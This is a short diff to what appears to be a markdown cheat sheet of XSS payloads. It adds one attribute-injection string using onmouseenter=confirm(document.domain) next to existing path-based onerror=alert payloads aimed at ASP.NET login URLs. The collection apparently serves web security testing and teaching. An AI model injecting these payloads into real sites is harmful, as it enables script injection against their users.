@@ -228,6 +228,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   /(A('onerror=%22alert%601%60%22testabcd))/
   /Orders/(A(%22onerror='alert%60xss%60'testabcd))/Login.aspx?ReturnUrl=/Orders
   (A(%22onerror='alert%601%60'testabcd))/Login.aspx?ReturnUrl=%2f
+  "%20onmouseenter=confirm(document.domain)%20value="
   ```
 </details>
 
